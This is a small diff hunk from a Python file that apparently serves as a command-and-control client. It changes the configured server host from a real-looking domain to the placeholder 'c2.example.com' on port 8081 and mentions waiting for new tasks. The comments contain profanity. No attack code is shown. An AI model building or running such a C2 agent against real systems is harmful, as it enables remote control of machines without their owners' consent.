@@ -14,7 +14,7 @@ import socket
 
 # START GHETTO ASS CONFIG, should be read in when compiled...
 
-HOST = "fuckd.at"
+HOST = "c2.example.com"
 PORT = "8081"
 
 # Timeout in seconds to wait for a new task
